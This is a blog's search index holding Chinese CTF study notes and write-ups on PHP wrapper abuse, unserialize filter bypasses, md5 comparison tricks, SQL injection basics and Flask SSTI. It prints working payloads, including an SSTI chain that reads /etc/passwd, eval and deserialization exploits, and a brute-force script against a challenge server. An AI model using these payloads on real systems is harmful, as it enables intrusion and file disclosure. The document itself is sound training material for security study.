<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Notes</title>
    <url>/2022/01/20/2022/1/notes/</url>
    <content><![CDATA[<p>参考文章：</p>
<p><a href="https://www.cnblogs.com/iloveacm/category/1791836.html">CTF - 随笔分类 - iloveacm - 博客园 (cnblogs.com)</a></p>
<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><p>直接上题目理解</p>
<p><img src="/2022/01/20/2022/1/notes/image-20220208200041496.png" alt="image-20220208200041496"></p>
<p>三个参数，两处if语句判断</p>
<p>很明显第一个if必须达成</p>
<p>看到了file_get_contents自然想到伪协议的利用</p>
<p><img src="/2022/01/20/2022/1/notes/image-20220208200239756.png" alt="image-20220208200239756"></p>
<p>考虑用data协议，将base编码后的数据流传入并且会等于  要求语句</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">text</span>=data://text/plain;base<span class="hljs-number">64</span>,d<span class="hljs-number">2</span>VsY<span class="hljs-number">29</span>tZSB<span class="hljs-number">0</span>byB<span class="hljs-number">0</span>aGUgempjdGY=<br></code></pre></td></tr></table></figure>

<p>到了下一个if，是检查变量是否传入flag了</p>
<p>先看到下面有include文件包含，而且提示useless.php，那我们可以伪协议读取一下</p>
<p><img src="/2022/01/20/2022/1/notes/image-20220208201116686.png" alt="image-20220208201116686"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/conver.base64-encode/</span>resource=useless.php<br></code></pre></td></tr></table></figure>

<p>读取源码</p>
<p><img src="/2022/01/20/2022/1/notes/image-20220208201257828.png" alt="image-20220208201257828"></p>
<p>再参考之前的一段代码</p>
<p><img src="/2022/01/20/2022/1/notes/image-20220208201333072.png" alt="image-20220208201333072"></p>
<p>那就是让我们传入序列化数据来读取flag</p>
<p><img src="/2022/01/20/2022/1/notes/image-20220208201436581.png" alt="image-20220208201436581"></p>
<p>生成后注意</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><code class="hljs livecodeserver">第三层的payuload中，不用伪协议读取uselless.php了，问了大佬才知道，<span class="hljs-built_in">file</span>=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=useless.php只能读取文件内容不能执行，也就事说，在这题里面，如果最终payload需要能够执行Flag类中的东西，就必须要被“包含”而不是“被读取”，所以要用<span class="hljs-built_in">file</span>=useless.php实现flag类中的<span class="hljs-built_in">file</span>-content执行读取flag<br></code></pre></td></tr></table></figure>

<p>最后payload</p>
<p>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22;}</p>
<h2 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h2><p>拿上rois的friend那题来说一下</p>
<p>思路：既然参数会被反序列化，那在这之前我们肯定得序列化数据</p>
<p>注意到能不能命令执行前，有一个check会检测是否有类里的变量名</p>
<p>绕过check再考虑能不能触发tostring里的eval函数完成命令执行</p>
<p><img src="/2022/01/20/2022/1/notes/image-20220208112853921.png" alt="image-20220208112853921"></p>
<p>这是Kitten类，看到有一个函数meow()触发后可以echo输出，这很可能就可以达到触发tostring的目的</p>
<p>接着下面的findFriend就是题目会进行的反序列化，我们序列化即可</p>
<p><img src="/2022/01/20/2022/1/notes/image-20220208113126070.png" alt="image-20220208113126070"></p>
<p>这个类的结构较为简单，思考如何触发里面的函数是关键</p>
<p><img src="/2022/01/20/2022/1/notes/image-20220208113242856.png" alt="image-20220208113242856"></p>
<p>check函数会对传进来的参数进行检查，我们就得绕过</p>
<p>先考虑绕过</p>
<p>采用16进制绕过的方法，将其中的字母i替换为16进制69，然后添加\ \确保转义成功吧（我是这么理解的）</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$a</span> = <span class="hljs-string">&#x27;\\69ncantat\\69on&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p><img src="/2022/01/20/2022/1/notes/image-20220208114457841.png" alt="image-20220208114457841"></p>
<p>之后的这种大小写替换我不太明白</p>
<p><img src="/2022/01/20/2022/1/notes/image-20220208115403846.png" alt="image-20220208115403846"></p>
<p>paylaod</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>class Witch<br>&#123;<br>    private $incantation &#x3D; &quot;phpinfo();&quot;;<br>&#125;<br><br>class Kitten<br>&#123;<br>    private $name;<br>    public $friend;<br>    function __construct()<br>    &#123;<br>        $this-&gt;$name &#x3D; new Witch();<br>        $this-&gt;friend &#x3D; &quot;1&quot;;<br>    &#125;<br>&#125;<br><br>$b &#x3D; serialize(new Kitten());<br>$b &#x3D; str_replace(&quot;s:18&quot;, &quot;S:18&quot;, $b);<br>$b &#x3D; str_replace(&quot;incantation&quot;, &quot;\\69ncantat\\69on&quot;, $b);<br>echo base64_encode($b);<br></code></pre></td></tr></table></figure>



<h2 id="php命令执行"><a href="#php命令执行" class="headerlink" title="php命令执行"></a>php命令执行</h2><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>现已有文件夹收录</p>
<p><img src="/2022/01/20/2022/1/notes/image-20220208112302049.png" alt="image-20220208112302049"></p>
<p>认为，sql和反序列化较难，注入有多种形式，而反序列化有unserialize()和phar</p>
<h2 id="phptrick"><a href="#phptrick" class="headerlink" title="phptrick"></a>phptrick</h2><p>1.extract()、parse_str() 等变量覆盖</p>
<p>2.弱类型比较</p>
<ul>
<li>is_numeric 前后有空格时，不会判断为true</li>
<li>松散（弱）比较时，两个0e开头的不同哈希会判断为相等</li>
<li>松散（弱）比较时，非数字的字符串序列和数字比较会自动转换</li>
<li>strcmp/ereg 等函数在传入参数类型为数组时会有非预期行为</li>
</ul>
<p><img src="/2022/01/20/2022/1/notes/image-20220123200022722.png" alt="image-20220123200022722"></p>
<h5 id="md5比较"><a href="#md5比较" class="headerlink" title="md5比较"></a>md5比较</h5><p><img src="/2022/01/20/2022/1/notes/image-20220207203810625.png" alt="image-20220207203810625"></p>
<p><a href="https://blog.csdn.net/wangyuxiang946/article/details/119845182">MD5加密漏洞(MD5绕过方式-0e绕过/数组绕过/MD5碰撞/MD5SQL注入)_wangyuxiang946的博客-CSDN博客_md5数组绕过</a></p>
<p>0e绕过记录其中一种</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">md5</span>(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>) == <span class="hljs-title">md5</span>(<span class="hljs-number">240610708</span>)</span><br></code></pre></td></tr></table></figure>

<p>做[BJDCTF 2020]easy_md5 这题偶然发现新的一种绕过方式</p>
<p>首先题目是一个输入框，排除sql注入后</p>
<p>抓包看见</p>
<p><img src="/2022/01/20/2022/1/notes/image-20220207204008096.png" alt="image-20220207204008096"></p>
<p>然后我之前想的太简单了，以为可以直接条件为真，其实还是要构造的</p>
<p>md5函数</p>
<p><img src="/2022/01/20/2022/1/notes/image-20220207204311973.png" alt="image-20220207204311973"></p>
<p>要达成md5后的值与前面语句拼接可以如下图</p>
<p><img src="/2022/01/20/2022/1/notes/image-20220207204231387.png" alt="image-20220207204231387"></p>
<p>然后是大佬的推理思路：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><code class="hljs angelscript">那我们从正向推算一下，要怎么得到我们要的答案。首先我们要找到一个字符串，这个字符串经过md5得到的<span class="hljs-number">16</span>位原始二进制的字符串能帮我们实现sql注入。首先<span class="hljs-keyword">or</span>这个字符串是必要的，同时为了配对原先sql语句里面有的单引号<br><br> 在<span class="hljs-keyword">or</span>的两边要有单引号，使它变成  password=‘xxx’<span class="hljs-keyword">or</span>‘xxx’  的形式，所以我们需要的字符串的原始二进制格式的字符串里要包含    ‘<span class="hljs-keyword">or</span>’    ，如果根据原始二进制来找到我们要的字符串可能会比较麻烦，那么可以根据<span class="hljs-number">32</span>位<span class="hljs-number">16</span>进制的字符串来查找，根据上面介绍的，  ‘<span class="hljs-keyword">or</span>’   对应的<span class="hljs-number">16</span>进制是   <span class="hljs-number">276f</span>7227    ，所以我们的目标就是要找一个字符串取<span class="hljs-number">32</span>位<span class="hljs-number">16</span>进制的md5值里带有<span class="hljs-number">276f</span>7227这个字段的，接着就是要看关键的数字部分了，在<span class="hljs-number">276f</span>7227这个字段后面紧跟一个数字，除了<span class="hljs-number">0</span>，<span class="hljs-number">1</span><span class="hljs-number">-9</span>，对应的asc码值是<span class="hljs-number">49</span><span class="hljs-number">-57</span>，转化为<span class="hljs-number">16</span>进制就是<span class="hljs-number">31</span><span class="hljs-number">-39</span>，也就是我们需要有<span class="hljs-number">276f</span>7227+（<span class="hljs-number">31</span><span class="hljs-number">-39</span>）这个字段，就可以满足要求。比如xxxxxxxxxxxxxxxx276f7227（<span class="hljs-number">31</span><span class="hljs-number">-39</span>）xxxxxx<br></code></pre></td></tr></table></figure>

<p>直观来看</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">content: <span class="hljs-number">129581926211651571912466741651878684928</span><br>hex: <span class="hljs-number">06</span>da5430449f8f6f23dfc1276f722738<br>raw: \x06\xdaT0D\x9f\x8fo<span class="hljs-comment">#\xdf\xc1&#x27;or&#x27;8</span><br>string: T0Do<span class="hljs-comment">#&#x27;or&#x27;8</span><br>————————————————<br>版权声明：本文为CSDN博主「March97」的原创文章，遵循CC <span class="hljs-number">4.0</span> BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/March97/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">81222922</span><br></code></pre></td></tr></table></figure>

<h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>首先基本指令过一过</p>
<p>show databases;</p>
<p>show tables;</p>
<p>增删查改</p>
<p>增</p>
<p>insert into 表名 values(value1,value2,value3….);</p>
<p>insert into 表名(列名1，列名2，列名3……) values(value1,value2,value3….);</p>
<p><img src="/2022/01/20/2022/1/notes/image-20220208111931314.png" alt="image-20220208111931314"></p>
<p>删</p>
<p>delete  from 表名 where 某一列名 = value;</p>
<p><img src="/2022/01/20/2022/1/notes/image-20220208112056657.png" alt="image-20220208112056657"></p>
<p>改</p>
<p>update &lt;表名&gt; set &lt;列名=更新值&gt; [where &lt;更新条件&gt;]</p>
<p><img src="/2022/01/20/2022/1/notes/image-20220208111956741.png" alt="image-20220208111956741"></p>
<p>查</p>
<p>多种方式，缓慢更新。</p>
<h2 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h2><p><a href="https://www.gem-love.com/2022/01/26/%E4%B8%80%E6%96%87%E6%90%9E%E5%AE%9AMySQL%E7%9B%B2%E6%B3%A8/">一文搞定MySQL盲注 - 颖奇L’Amore (gem-love.com)</a></p>
<p>substr函数，会返回字符串的一部分</p>
<p>可以有三个参数，substr（string，start，length）</p>
<p><img src="/2022/01/20/2022/1/notes/image-20220206162008817.png" alt="image-20220206162008817"></p>
<p><img src="/2022/01/20/2022/1/notes/image-20220206162040957.png" alt="image-20220206162040957"></p>
<p>substr被禁时可以考虑mid</p>
<p><img src="/2022/01/20/2022/1/notes/image-20220206162137283.png" alt="image-20220206162137283"></p>
<p><img src="/2022/01/20/2022/1/notes/image-20220206162312685.png" alt="image-20220206162312685"></p>
<h5 id="绕过空格检测"><a href="#绕过空格检测" class="headerlink" title="绕过空格检测"></a>绕过空格检测</h5><p>1.注释符绕过/**/</p>
<p>2.括号绕过空格()</p>
<p><img src="/2022/01/20/2022/1/notes/image-20220209121548440.png" alt="image-20220209121548440"></p>
<p><img src="/2022/01/20/2022/1/notes/image-20220209122044457.png" alt="image-20220209122044457"></p>
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>Dasctf x Jlenu</title>
    <url>/2021/10/25/2021/ctf/Dasctf%20x%20Jlenu/</url>
    <content><![CDATA[<p> 这次坐大牢，web做不出来==</p>
<p> 在一个大佬点拨下，懂得misc的签到用ssti注入做（虽然迟了点交flag)</p>
<h2 id="WELCOME-DASCTFxJlenu"><a href="#WELCOME-DASCTFxJlenu" class="headerlink" title="WELCOME DASCTFxJlenu"></a>WELCOME DASCTFxJlenu</h2><p> 直接网上查到payload：<a href="https://www.cnblogs.com/hackxf/p/10480071.html">python-flask-ssti(模版注入漏洞) - 晓枫v5 - 博客园 (cnblogs.com)</a></p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><code class="hljs markdown">&#x27;a&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">2</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;/etc/passwd&#x27;</span>).read()<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/25/2021/ctf/Dasctf%20x%20Jlenu/image-20211025224845346.png"></p>
<p>然后试探查看，最后</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><code class="hljs markdown">&#x27;a&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">2</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;flag.txt&#x27;</span>).read()<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/25/2021/ctf/Dasctf%20x%20Jlenu/image-20211025225751134.png"></p>
<h2 id="迷路的魔法少女"><a href="#迷路的魔法少女" class="headerlink" title="迷路的魔法少女"></a>迷路的魔法少女</h2><p>今天用问到的payload复现了一下</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><code class="hljs sas">?action=<span class="hljs-meta">add</span><span class="hljs-variable">&amp;attrid</span>[]=1<span class="hljs-variable">&amp;attrvalue</span>[]=2<span class="hljs-string">&quot;);phpinfo();//</span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/25/2021/ctf/Dasctf%20x%20Jlenu/image-20211026111906974.png"></p>
<p>代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br><br>extract($_GET);<br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">String2Array</span>(<span class="hljs-params">$data</span>)</span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span>($data == <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>();<br>  @<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;\$array = <span class="hljs-subst">$data</span>;&quot;</span>);<br>  <span class="hljs-keyword">return</span> $array;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(is_array($attrid) &amp;&amp; is_array($attrvalue))<br>&#123;<br>    $attrstr .= <span class="hljs-string">&#x27;array(&#x27;</span>;<br>    $attrids = count($attrid);<br>    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>; $i&lt;$attrids; $i++)<br>    &#123;<br>      $attrstr .= <span class="hljs-string">&#x27;&quot;&#x27;</span>.intval($attrid[$i]).<span class="hljs-string">&#x27;&quot;=&gt;&#x27;</span>.<span class="hljs-string">&#x27;&quot;&#x27;</span>.$attrvalue[$i].<span class="hljs-string">&#x27;&quot;&#x27;</span>;<br>      <span class="hljs-keyword">if</span>($i &lt; $attrids<span class="hljs-number">-1</span>)<br>      &#123;<br>        $attrstr .= <span class="hljs-string">&#x27;,&#x27;</span>;<br>      &#125;<br>    &#125;<br>    $attrstr .= <span class="hljs-string">&#x27;);&#x27;</span>;<br>&#125;<br><br>String2Array($attrstr);<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>rois-冬令营</title>
    <url>/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/</url>
    <content><![CDATA[<p> 偶然得知了rois举办了这个冬令营</p>
<p>web题目大部分自己做，有几道是在别人帮助下的</p>
<p>很高兴这次密码学做出了两道简单题</p>
<p>今天写下writeup总结一下</p>
<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205214412266.png" alt="image-20220205214412266"></p>
<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205214430069.png" alt="image-20220205214430069"></p>
<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205214507437.png" alt="image-20220205214507437"></p>
<p>这题确实是签到题，不过刚开始没有想到</p>
<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205214617858.png" alt="image-20220205214617858"></p>
<p>打开后是这样的</p>
<p>按照提示输入flag参数</p>
<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205214651070.png" alt="image-20220205214651070"></p>
<p>很明显这个javascript弹窗验证了输入flag与校验flag是否一致</p>
<p>所以不知道flag的前提下无法输入正确</p>
<p>放弃一段时间后我想起来可以抓包看看，因为这只是一道签到题不会太难考点</p>
<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215003047.png" alt="image-20220205215003047"></p>
<p>这是直接送上源码了</p>
<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215104974.png" alt="image-20220205215104974"></p>
<h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215145268.png" alt="image-20220205215145268"></p>
<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215246704.png" alt="image-20220205215246704"></p>
<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215308960.png" alt="image-20220205215308960"></p>
<p>通过回显猜测到考点</p>
<p>xff头的使用</p>
<p>后面我在同学提醒下才知道可以bp爆破，之前一直手动换ip。。</p>
<h4 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215904689.png" alt="image-20220205215904689"></p>
<p>这题是靠搜索出来的</p>
<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205220015271.png" alt="image-20220205220015271"></p>
<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215948168.png" alt="image-20220205215948168"></p>
<h4 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205220225482.png" alt="image-20220205220225482"></p>
<p>抓包修改即可</p>
<h4 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205220249818.png" alt="image-20220205220249818"></p>
<p>这题稍微麻烦点</p>
<p>我吸取的教训是bp要用专业版，这样线程才能高，别用什么社区版爆破半天出不来</p>
<p>爆破设置如图</p>
<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220207110042677.png" alt="image-20220207110042677"></p>
<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/notes.md" alt="image-20220207110002361"></p>
<p>自己尝试写的脚本</p>
<p>当初没有成功，现在可以了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>scentence = <span class="hljs-string">&#x27;敏感文件是什么？？常用工具dirsearch  https://github.com/maurosoria/dirsearch/ 下载可能需要科学上网&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">100</span>,<span class="hljs-number">1000</span>):<br>    url1 = <span class="hljs-string">&#x27;http://101.35.106.33:1580/?level1=hello&#x27;</span><br>    payload = &#123;<span class="hljs-string">&#x27;level1&#x27;</span>:<span class="hljs-string">&#x27;world&#x27;</span>, <span class="hljs-string">&#x27;level2&#x27;</span>: i&#125;<br>    r = requests.post(url1, data=payload)<br>    <span class="hljs-comment">#print(r.text)</span><br>    <span class="hljs-keyword">if</span> scentence <span class="hljs-keyword">in</span> r.text:<br>        print(<span class="hljs-string">&quot;爆破数字为&#123;&#125;&quot;</span>.format(i))<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># print(&quot;当前数字&#123;&#125;&quot;.format(i))</span><br>        <span class="hljs-keyword">continue</span><br>        <span class="hljs-comment"># print(&#x27;no&#x27;)</span><br></code></pre></td></tr></table></figure>

<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220207110330038.png" alt="image-20220207110330038"></p>
<p>然后这题后面无非是post传参、md5绕过、robots协议、dirsearch扫描之类的小知识点</p>
<h4 id="6"><a href="#6" class="headerlink" title="6."></a>6.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205220453175.png" alt="image-20220205220453175"></p>
<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205220509263.png" alt="image-20220205220509263"></p>
<p>这题属实是有点小坑</p>
<p>这个$_SERVER[‘QUERY_STRING’]，经过查询是截取get传参？背后的字符串</p>
<p>下面的if判断是否传进is_admin这个参数，如果没有就完成变量覆盖</p>
<p>最后变量为真就输出flag</p>
<p>难点就在前面不能有那个参数，本来按照以前解法就urlencode就可以了</p>
<p>但是这边已经好心地先帮你decode了</p>
<p>后面才知道有php有一个特性，就是会将空格解析为_</p>
<p><a href="https://blog.csdn.net/qq_45521281/article/details/105871192">利用PHP的字符串解析特性绕过Waf_WHOAMIAnony的博客-CSDN博客_php的字符串解析特性</a></p>
<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221201519.png" alt="image-20220205221201519"></p>
<h4 id="7"><a href="#7" class="headerlink" title="7."></a>7.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221233952.png" alt="image-20220205221233952"></p>
<p>md5数组绕过</p>
<h4 id="8"><a href="#8" class="headerlink" title="8."></a>8.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221310685.png" alt="image-20220205221310685"></p>
<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221332540.png" alt="image-20220205221332540"></p>
<p>这题就是明确目标：绕过is_file函数</p>
<p>查询到文章</p>
<p><a href="https://www.freebuf.com/articles/web/261379.html">和开发斗智斗勇的日常：PHP is_file()函数绕过 - FreeBuf网络安全行业门户</a></p>
<p>创造一个不存在路径就可以绕过</p>
<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221557365.png" alt="image-20220205221557365"></p>
<h4 id="9"><a href="#9" class="headerlink" title="9."></a>9.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221640928.png" alt="image-20220205221640928"></p>
<p>万能密码</p>
<h4 id="10"><a href="#10" class="headerlink" title="10."></a>10.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221707108.png" alt="image-20220205221707108"></p>
<p>简单的报错查询注入即可</p>
<h4 id="11"><a href="#11" class="headerlink" title="11."></a>11.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221735035.png" alt="image-20220205221735035"></p>
<p>题目</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br>error_reporting(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Kitten</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> $name;<br>    <span class="hljs-keyword">public</span> $friend;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$word</span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;$name = $word;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">meow</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Meow~ My name is &quot;</span> . <span class="hljs-keyword">$this</span>-&gt;$name . <span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">findFriend</span>(<span class="hljs-params">$sleepingKitten</span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;friend = unserialize($sleepingKitten);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Witch</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> $incantation;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;incantation);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Witch&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params">$sleepingKitten</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/incantation/i&quot;</span>, $sleepingKitten)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;h3&gt;Witchcraft is NOT ALLOWED!&lt;h3&gt;&quot;</span>);<br>    &#125;<br>&#125;<br><br>$pusheen = <span class="hljs-keyword">new</span> Kitten(<span class="hljs-string">&quot;pusheen&quot;</span>);<br>$pusheen-&gt;meow();<br>$sleepingKitten = base64_decode($_POST[<span class="hljs-string">&quot;friend&quot;</span>]);<br>check($sleepingKitten);<br>$pusheen-&gt;findFriend($sleepingKitten);<br>$pusheen-&gt;friend-&gt;meow();<br><br></code></pre></td></tr></table></figure>

<p>分析一下代码</p>
<p>最后要成功触发tostring方法执行eval函数才会输出flag</p>
<p>贴上payload脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Witch</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> $incantation = <span class="hljs-string">&quot;phpinfo();&quot;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Kitten</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> $name;<br>    <span class="hljs-keyword">public</span> $friend;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;$name = <span class="hljs-keyword">new</span> Witch();<br>        <span class="hljs-keyword">$this</span>-&gt;friend = <span class="hljs-string">&quot;1&quot;</span>;<br>    &#125;<br>&#125;<br><br>$b = serialize(<span class="hljs-keyword">new</span> Kitten());<br>$b = str_replace(<span class="hljs-string">&quot;s:18&quot;</span>, <span class="hljs-string">&quot;S:18&quot;</span>, $b);<span class="hljs-comment">//表示字符类型的s大写时，会被当16进制解析</span><br>$b = str_replace(<span class="hljs-string">&quot;incantation&quot;</span>, <span class="hljs-string">&quot;\\69ncantat\\69on&quot;</span>, $b);<span class="hljs-comment">//运用16进制绕过字符过滤</span><br><span class="hljs-keyword">echo</span> base64_encode($b);<br></code></pre></td></tr></table></figure>

<h3 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h3><h4 id="1-1"><a href="#1-1" class="headerlink" title="1."></a>1.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205222140518.png" alt="image-20220205222140518"></p>
